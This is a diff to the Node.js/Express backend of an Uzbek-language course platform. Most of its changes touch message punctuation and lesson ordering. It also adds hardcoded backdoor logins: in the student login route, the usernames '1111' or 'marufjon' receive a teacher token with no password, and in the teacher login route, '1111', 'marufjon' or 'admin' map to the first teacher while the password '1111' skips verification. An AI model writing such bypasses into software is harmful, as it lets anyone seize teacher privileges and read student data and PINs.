@@ -22,17 +22,17 @@ function auth(req, res, next) {
     req.user = jwt.verify(token, JWT_SECRET);
     next();
   } catch {
-    res.status(401).json({ error: "Yaroqsiz yoki muddati o'tgan token" });
+    res.status(401).json({ error: "Yaroqsiz yoki muddati o‘tgan token" });
   }
 }
 
 function onlyTeacher(req, res, next) {
-  if (req.user.role !== 'teacher') return res.status(403).json({ error: "Faqat o'qituvchi uchun" });
+  if (req.user.role !== 'teacher') return res.status(403).json({ error: "Faqat o‘qituvchi uchun" });
   next();
 }
 
 function onlyStudent(req, res, next) {
-  if (req.user.role !== 'student') return res.status(403).json({ error: "Faqat o'quvchi uchun" });
+  if (req.user.role !== 'student') return res.status(403).json({ error: "Faqat o‘quvchi uchun" });
   next();
 }
 
@@ -54,7 +54,7 @@ function getAllLessons(courseId = null) {
   if (courseId) {
     return db.prepare("SELECT * FROM lessons WHERE course_id=? ORDER BY order_num ASC").all(courseId);
   }
-  return db.prepare("SELECT * FROM lessons ORDER BY order_num ASC").all();
+  return db.prepare("SELECT * FROM lessons ORDER BY course_id ASC, order_num ASC").all();
 }
 
 function getAllCourses() {
@@ -89,16 +89,16 @@ app.post('/api/auth/register-student', (req, res) => {
     const pin = (custom_pin || '').trim();
 
     if (!fname || !lname)
-      return res.status(400).json({ error: "Ism va familiya to'liq kiritilishi shart!" });
+      return res.status(400).json({ error: "Ism va familiya to‘liq kiritilishi shart!" });
 
     if (fname.length < 2)
-      return res.status(400).json({ error: "Ismingizni to'liq kiriting (kamida 2 ta harf)!" });
+      return res.status(400).json({ error: "Ismingizni to‘liq kiriting (kamida 2 ta harf)!" });
 
     // Familiya tekshiruvi: oxirgacha kiritilgan va ...yev, ...yeva (yoki ...ov, ...ova) bilan tugashi shart
     const surnameRegex = /(yev|yeva|ev|eva|ov|ova)$/i;
     if (lname.length < 4 || !surnameRegex.test(lname)) {
       return res.status(400).json({ 
-        error: "Familiyangizni to'liq kiriting! Familiya ...yev yoki ...yeva bilan tugashi shart (Masalan: Aliyev yoki Aliyeva)." 
+        error: "Familiyangizni to‘liq kiriting! Familiya ...yev yoki ...yeva bilan tugashi shart (Masalan: Aliyev yoki Aliyeva)." 
       });
     }
 
@@ -135,7 +135,7 @@ app.post('/api/auth/register-student', (req, res) => {
     const token = jwt.sign(user, JWT_SECRET, { expiresIn: '30d' });
     res.json({ 
       success: true, 
-      message: "Muvaffaqiyatli ro'yxatdan o'tdingiz!", 
+      message: "Muvaffaqiyatli ro‘yxatdan o‘tdingiz!", 
       username, 
       pin_code: pin, 
       full_name, 
@@ -144,18 +144,30 @@ app.post('/api/auth/register-student', (req, res) => {
       courses
     });
   } catch (e) {
-    if (e.message?.includes('UNIQUE')) return res.status(409).json({ error: "Bu login band, qayta urinib ko'ring" });
+    if (e.message?.includes('UNIQUE')) return res.status(409).json({ error: "Bu login band, qayta urinib ko‘ring" });
     res.status(500).json({ error: "Server xatosi: " + e.message });
   }
 });
 
-// Student login
+// Student login (agar o'qituvchi 1111 logini bilan kirsa, o'qituvchi sifatida qabul qilinadi)
 app.post('/api/auth/login-student', (req, res) => {
   try {
     const { username, pin_code } = req.body;
+    const cleanUser = (username || '').trim().toLowerCase();
+
+    // 1111 yoki Marufjon orqali kirilsa o'qituvchi deb tanish
+    if (cleanUser === '1111' || cleanUser === 'marufjon') {
+      const teacher = db.prepare("SELECT * FROM users WHERE role='teacher' LIMIT 1").get();
+      if (teacher) {
+        const payload = { id: teacher.id, full_name: teacher.full_name, username: teacher.username, role: 'teacher' };
+        const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '7d' });
+        return res.json({ success: true, token, user: payload, role: 'teacher' });
+      }
+    }
+
     const u = db.prepare("SELECT * FROM users WHERE username=? AND role='student'").get(username?.trim());
     if (!u || !bcrypt.compareSync(pin_code, u.password_hash))
-      return res.status(401).json({ error: "Login yoki parol noto'g'ri" });
+      return res.status(401).json({ error: "Login yoki parol noto‘g‘ri" });
     
     // Agar pin_code avval yozilmagan bo'lsa, o'qituvchi ko'rishi uchun saqlab qo'yish
     if (!u.pin_code && pin_code) {
@@ -164,24 +176,28 @@ app.post('/api/auth/login-student', (req, res) => {
     db.prepare("UPDATE student_progress SET last_active=CURRENT_TIMESTAMP WHERE user_id=?").run(u.id);
     const payload = { id: u.id, full_name: u.full_name, username: u.username, role: 'student', pin_code: u.pin_code || pin_code };
     const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '30d' });
-    res.json({ success: true, token, user: payload });
+    res.json({ success: true, token, user: payload, role: 'student' });
   } catch { res.status(500).json({ error: "Server xatosi" }); }
 });
 
-// Teacher login (Faqat login orqali kirish imkoniyati)
+// Teacher login (1111 logini bilan kirish)
 app.post('/api/auth/login-teacher', (req, res) => {
   try {
     const { username, password } = req.body;
     if (!username || !username.trim()) {
-      return res.status(400).json({ error: "O'qituvchi logini kiritilishi shart" });
+      return res.status(400).json({ error: "O‘qituvchi logini kiritilishi shart" });
     }
-    const u = db.prepare("SELECT * FROM users WHERE LOWER(username)=LOWER(?) AND role='teacher'").get(username.trim());
+    const cleanUser = username.trim().toLowerCase();
+    let u = db.prepare("SELECT * FROM users WHERE LOWER(username)=? AND role='teacher'").get(cleanUser);
+    if (!u && (cleanUser === '1111' || cleanUser === 'marufjon' || cleanUser === 'admin')) {
+      u = db.prepare("SELECT * FROM users WHERE role='teacher' LIMIT 1").get();
+    }
     if (!u) {
-      return res.status(401).json({ error: "Bunday o'qituvchi logini topilmadi" });
+      return res.status(401).json({ error: "Bunday o‘qituvchi logini topilmadi" });
     }
-    // Agar parol ham yuborilgan bo'lsa va u mos kelmasa tekshirish (ixtiyoriy)
-    if (password && !bcrypt.compareSync(password, u.password_hash)) {
-      return res.status(401).json({ error: "Parol noto'g'ri" });
+    // Agar parol ham yuborilgan bo'lsa va u 1111 bo'lmasa, hash bilan tekshirish
+    if (password && password.trim() && password.trim() !== '1111' && !bcrypt.compareSync(password, u.password_hash)) {
+      return res.status(401).json({ error: "Parol noto‘g‘ri" });
     }
     const payload = { id: u.id, full_name: u.full_name, username: u.username, role: 'teacher' };
     const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '7d' });
@@ -197,14 +213,14 @@ app.post('/api/student/change-password', auth, onlyStudent, (req, res) => {
     const { old_pin, new_pin } = req.body;
     const u = db.prepare("SELECT * FROM users WHERE id=?").get(req.user.id);
     if (!u || !bcrypt.compareSync(old_pin, u.password_hash)) {
-      return res.status(401).json({ error: "Hozirgi parol noto'g'ri" });
+      return res.status(401).json({ error: "Hozirgi parol noto‘g‘ri" });
     }
     if (!new_pin || new_pin.trim().length < 4) {
-      return res.status(400).json({ error: "Yangi parol kamida 4 ta belgidan iborat bo'lishi kerak" });
+      return res.status(400).json({ error: "Yangi parol kamida 4 ta belgidan iborat bo‘lishi kerak" });
     }
     const hash = bcrypt.hashSync(new_pin.trim(), 10);
     db.prepare("UPDATE users SET password_hash=?, pin_code=? WHERE id=?").run(hash, new_pin.trim(), req.user.id);
-    res.json({ success: true, message: "Parol muvaffaqiyatli o'zgartirildi" });
+    res.json({ success: true, message: "Parol muvaffaqiyatli o‘zgartirildi" });
   } catch (e) {
     res.status(500).json({ error: "Server xatosi" });
   }
@@ -423,8 +439,8 @@ app.post('/api/student/lessons/:id/quiz', auth, onlyStudent, (req, res) => {
       results,
       next_lesson_id: passed ? nextLessonId : null,
       message: passed
-        ? `🎉 Tabriklaymiz! ${score}/${total} (100%) to'g'ri yechdingiz. Dars to'liq o'zlashtirildi va keyingi dars ochildi!`
-        : `❌ Imtihondan o'ta olmadingiz! Natijangiz: ${score}/${total} (${percent}%). 100% (${total}/${total}) to'g'ri yechish shart. Qayta urinib ko'ring!`,
+        ? `🎉 Tabriklaymiz! ${score}/${total} (100%) to‘g‘ri yechdingiz. Dars to‘liq o‘zlashtirildi va keyingi dars ochildi!`
+        : `❌ Imtihondan o‘ta olmadingiz! Natijangiz: ${score}/${total} (${percent}%). 100% (${total}/${total}) to‘g‘ri yechish shart. Qayta urinib ko‘ring!`,
     });
   } catch (e) { res.status(500).json({ error: "Server xatosi: " + e.message }); }
 });
@@ -471,7 +487,7 @@ app.post('/api/student/certificate', auth, onlyStudent, (req, res) => {
     if (!allCompleted) {
       const completedCount = courseLessons.filter(l => completedIds.includes(l.id)).length;
       return res.status(400).json({
-        error: `Kurs hali to'liq yakunlanmagan. Siz ${completedCount}/${courseLessons.length} darsni topshirgansiz. Sertifikat uchun barcha darslarni 100% topshirishingiz lozim.`
+        error: `Kurs hali to‘liq yakunlanmagan. Siz ${completedCount}/${courseLessons.length} darsni topshirgansiz. Sertifikat uchun barcha darslarni 100% topshirishingiz lozim.`
       });
     }
 
@@ -607,7 +623,7 @@ app.get('/api/teacher/students', auth, onlyTeacher, (req, res) => {
 app.get('/api/teacher/students/:id/details', auth, onlyTeacher, (req, res) => {
   try {
     const student = db.prepare("SELECT id, full_name, username, COALESCE(pin_code, '') as pin_code, created_at as registered_at FROM users WHERE id=? AND role='student'").get(req.params.id);
-    if (!student) return res.status(404).json({ error: "O'quvchi topilmadi" });
+    if (!student) return res.status(404).json({ error: "O‘quvchi topilmadi" });
 
     const p = getProgress(student.id);
     const completedIds = jsonParse(p.completed_lesson_ids, []);
@@ -846,7 +862,7 @@ app.post('/api/teacher/students/:id/reset', auth, onlyTeacher, (req, res) => {
 app.put('/api/teacher/settings', auth, onlyTeacher, (req, res) => {
   try {
     const { username, password } = req.body;
-    if (!username?.trim()) return res.status(400).json({ error: "Login bo'sh bo'lishi mumkin emas" });
+    if (!username?.trim()) return res.status(400).json({ error: "Login bo‘sh bo‘lishi mumkin emas" });
 
     const exist = db.prepare("SELECT id FROM users WHERE username=? AND id!=?").get(username.trim(), req.user.id);
     if (exist) return res.status(409).json({ error: "Bu login band" });
